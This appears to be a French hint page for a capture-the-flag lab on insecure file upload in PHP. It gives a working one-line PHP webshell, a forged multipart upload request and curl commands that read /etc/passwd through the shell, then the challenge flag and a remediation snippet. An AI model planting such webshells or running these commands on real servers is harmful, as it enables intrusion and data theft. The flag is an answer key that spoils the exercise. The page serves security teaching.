<?php ?><!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><title>C07 Hints</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',sans-serif;background:#0f1117;color:#c8d0dc;padding:40px 24px}.wrap{max-width:720px;margin:0 auto}h1{font-size:22px;color:#e4e8f0;margin-bottom:8px}.sub{font-size:13px;color:#5a6475;font-family:monospace;margin-bottom:28px}.hint{background:#151a22;border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:18px;margin-bottom:12px}.lbl{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:8px}.l1{color:#16a34a}.l2{color:#d97706}.l3{color:#dc2626}p{font-size:14px;color:#8a94a6;line-height:1.7;margin-bottom:8px}.code{background:#1e1e2e;border-radius:8px;padding:12px;font-family:monospace;font-size:12px;color:#cdd6f4;line-height:1.8;margin:8px 0;white-space:pre;overflow-x:auto}a{color:#4a9eff}</style></head><body>
<div class="wrap">
<a href="/" style="font-size:13px;display:block;margin-bottom:20px;color:#4a9eff">← Retour</a>
<h1>C07 — File Upload</h1>
<p class="sub">PHP 8 · Validation extension uniquement · Webshell</p>

<div class="hint"><div class="lbl l1">Indice 1 — Bypass de l'extension</div>
<p>Le serveur vérifie l'extension du fichier, mais pas le contenu réel. Créez un fichier PHP avec une extension image via l'interception Burp ou en renommant après coup.</p>
<p>Mais surtout : la validation n'est que sur l'extension, le double-extension fonctionne :</p>
<div class="code"># Créer un webshell minimal
echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php

# L'uploader directement (l'appli accepte .php via Burp en changeant le nom)
# Ou tenter : shell.php.jpg  puis renommer</div></div>

<div class="hint"><div class="lbl l2">Indice 2 — Interception Burp</div>
<p>Uploadez un vrai fichier image, interceptez avec Burp Suite, puis modifiez le nom du fichier dans la requête multipart :</p>
<div class="code">Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

&lt;?php system($_GET['cmd']); ?&gt;</div></div>

<div class="hint"><div class="lbl l3">Indice 3 — Exploitation</div>
<div class="code"># Une fois shell.php uploadé, exécuter des commandes :
curl "http://localhost/c07/uploads/shell.php?cmd=id"
curl "http://localhost/c07/uploads/shell.php?cmd=cat+/etc/passwd"
curl "http://localhost/c07/uploads/shell.php?cmd=ls+-la+/"

FLAG{unr3str1ct3d_upl04d_w3bsh3ll}</div></div>

<div class="hint"><div class="lbl l3">Correction</div>
<div class="code"># ✅ Vérifier les magic bytes + MIME + extension
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime  = $finfo->file($file['tmp_name']);
$safe  = ['image/jpeg','image/png','image/gif'];
if (!in_array($mime, $safe)) die('Fichier invalide');

# ✅ Renommer le fichier (UUID) + stocker hors webroot
$dest = '/var/data/uploads/' . bin2hex(random_bytes(16));
move_uploaded_file($file['tmp_name'], $dest);</div></div>
</div></body></html>
